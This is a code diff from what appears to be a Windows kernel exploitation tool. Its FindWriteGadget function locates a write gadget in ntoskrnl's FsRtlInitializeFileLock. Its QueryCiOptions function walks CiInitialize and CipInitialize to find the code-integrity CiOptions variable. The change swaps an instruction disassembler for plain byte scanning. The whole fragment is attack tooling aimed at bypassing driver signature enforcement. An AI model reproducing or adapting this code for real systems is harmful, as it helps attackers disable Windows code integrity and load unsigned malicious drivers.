@@ -1,5 +1,4 @@
 #include "global.h"
-#include "hde/hde64.h"
 
 void FindWriteGadget(_In_ PVOID MappedBase)
 {
@@ -11,7 +10,6 @@ void FindWriteGadget(_In_ PVOID MappedBase)
 	// Printf(L"FsRtlInitializeFileLock: %p\n", FsRtlInitializeFileLock);
 
 	LONG Rel = 0;
-	hde64s hs;
 	ULONG c = 0;
 	ULONG j = 0;
 	do
@@ -21,11 +19,7 @@ void FindWriteGadget(_In_ PVOID MappedBase)
 			Rel = *reinterpret_cast<PLONG>(FsRtlInitializeFileLock + c);
 			break;
 		}
-		hde64_disasm(FsRtlInitializeFileLock + c, &hs);
-		if (hs.flags & F_ERROR)
-			break;
-		c += hs.len;
-
+		c++;
 	} while (c < 256);
 
 	const PUCHAR mov = FsRtlInitializeFileLock + Rel + 2;
@@ -38,7 +32,6 @@ void QueryCiOptions(_In_ PVOID MappedBase)
 {
 	ULONG c;
 	LONG Rel = 0;
-	hde64s hs;
 
 	const PUCHAR CiInitialize = reinterpret_cast<PUCHAR>(GetProcedureAddress(reinterpret_cast<ULONG_PTR>(MappedBase), "CiInitialize"));
 	// Printf(L"CiInitialize:    %p\n", CiInitialize);
@@ -59,12 +52,7 @@ void QueryCiOptions(_In_ PVOID MappedBase)
 			Rel = *reinterpret_cast<PLONG>(CiInitialize + c + 1);
 			break;
 		}
-
-		hde64_disasm(CiInitialize + c, &hs);
-		if (hs.flags & F_ERROR)
-			break;
-		c += hs.len;
-
+		c++;
 	} while (c < 256);
 
 	const PUCHAR CipInitialize = CiInitialize + c + 5 + Rel;
@@ -78,11 +66,7 @@ void QueryCiOptions(_In_ PVOID MappedBase)
 			Rel = *reinterpret_cast<PLONG>(CipInitialize + c + 2);
 			break;
 		}
-		hde64_disasm(CipInitialize + c, &hs);
-		if (hs.flags & F_ERROR)
-			break;
-		c += hs.len;
-
+		c++;
 	} while (c < 256);
 
 	const PUCHAR MappedCiOptions = CipInitialize + c + 6 + Rel;
